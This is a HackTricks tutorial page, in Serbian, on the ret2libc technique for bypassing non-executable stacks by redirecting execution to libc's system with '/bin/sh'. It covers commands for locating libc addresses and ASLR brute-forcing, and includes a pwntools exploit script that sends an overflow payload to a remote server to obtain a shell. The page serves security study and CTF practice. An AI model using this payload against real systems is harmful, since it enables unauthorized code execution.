# Ret2lib

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **Osnovne informacije**

Suština **Ret2Libc** je preusmeravanje izvršnog toka ranjivog programa ka funkciji unutar deljene biblioteke (npr. **system**, **execve**, **strcpy**) umesto izvršavanja shell koda koji je dostavljen od strane napadača na steku. Napadač kreira payload koji modifikuje povratnu adresu na steku kako bi pokazivala ka željenoj funkciji biblioteke, dok istovremeno organizuje da svi neophodni argumenti budu ispravno postavljeni prema konvenciji pozivanja.

### **Primer koraka (simplifikovan)**

* Dobiti adresu funkcije koja se poziva (npr. system) i komandu koja se poziva (npr. /bin/sh)
* Generisati ROP lanac da bi se prosledio prvi argument koji pokazuje ka stringu komande i izvršni tok ka funkciji

## Pronalaženje adresa

* Pretpostavljajući da se `libc` koji se koristi nalazi na trenutnoj mašini, možete pronaći gde će biti učitan u memoriju sa:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Ako želite da proverite da li ASLR menja adresu libc-a, možete uraditi sledeće:

```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```

* Znajući korišćenu libc biblioteku, takođe je moguće pronaći offset do `system` funkcije sa:

```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```

* Znajući korišćenu libc biblioteku, takođe je moguće pronaći offset do stringa `/bin/sh` funkcije sa:

```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```

### Korišćenje gdb-peda / GEF

Znajući koji se libc koristi, takođe je moguće koristiti Peda ili GEF da biste dobili adresu funkcije **system**, funkcije **exit** i stringa **`/bin/sh`** :

```
p system
p exit
find "/bin/sh"
```

### Korišćenje /proc/\<PID>/maps

Ako proces stvara **dečije procese** svaki put kada komunicirate s njim (mrežni server), pokušajte **pročitati** taj fajl (verovatno će vam biti potrebno da budete root).

Ovde možete pronaći **tačno gde je učitan libc** unutar procesa i **gde će biti učitan** za svako dete procesa.

![](<../../../../.gitbook/assets/image (95).png>)

U ovom slučaju učitan je na **0xb75dc000** (Ovo će biti bazna adresa libc-a)

## Nepoznat libc

Moguće je da **ne znate koji libc učitava binarni fajl** (jer se možda nalazi na serveru do kojeg nemate pristup). U tom slučaju možete iskoristiti ranjivost da **procurete neke adrese i pronađete koji libc** biblioteka se koristi:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

I možete pronaći šablon pwntools-a za ovo u:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## Zaobilaženje ASLR-a u 32 bita

Ovi napadi brute-forcinga su **korisni samo za 32-bitne sisteme**.

* Ako je eksploatacija lokalna, možete pokušati brute-force baznu adresu libc-a (korisno za 32-bitne sisteme):

```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```

* Ako napadate udaljeni server, možete pokušati **bruteforce-ovati adresu `libc` funkcije `usleep`**, prosleđujući kao argument 10 (na primer). Ako server u nekom trenutku **dodatno odgovori za 10 sekundi**, pronašli ste adresu ove funkcije.

## Jedan Gadget

{% content-ref url="../../one-gadget.md" %}
[one-gadget.md](../../one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Primer Koda

U ovom primeru, ASLR bruteforce je integrisan u kod, a ranjivi binarni fajl se nalazi na udaljenom serveru:

```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```

## Primer koda x64 Ret2lib

Proverite primer sa:

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-into-printf (ili puts)

Ovo omogućava **procurivanje informacija iz procesa** pozivanjem `printf`/`puts` sa određenim podacima postavljenim kao argument.

## Ret2printf

Ovo u osnovi znači zloupotrebu **Ret2lib-a kako bi se transformisao u ranjivost `printf` format string-ova** koristeći `ret2lib` za pozivanje printf sa vrednostima koje se zloupotrebljavaju (zvuči beskorisno ali je moguće):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Ostali primeri i reference

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, dajući procuru do adrese funkcije u libc-u, koristeći jedan gadget
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bita, ASLR omogućen ali bez PIE-a, prvi korak je popuniti prekoračenje do bajta 0x00 kanara, zatim pozvati puts i procuriti ga. Sa kanarom se kreira ROP gedžet za pozivanje puts-a kako bi procurio adresu puts-a iz GOT-a, zatim ROP gedžet za pozivanje `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bita, ASLR omogućen, bez kanara, prekoračenje steka u glavnoj funkciji iz podfunkcije. ROP gedžet za pozivanje puts-a kako bi procurio adresu puts-a iz GOT-a, zatim pozvati jedan gedžet.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bita, bez PIE-a, bez kanara, bez relro, nx. Koristi funkciju write za procurivanje adrese write (libc) i poziva jedan gedžet.
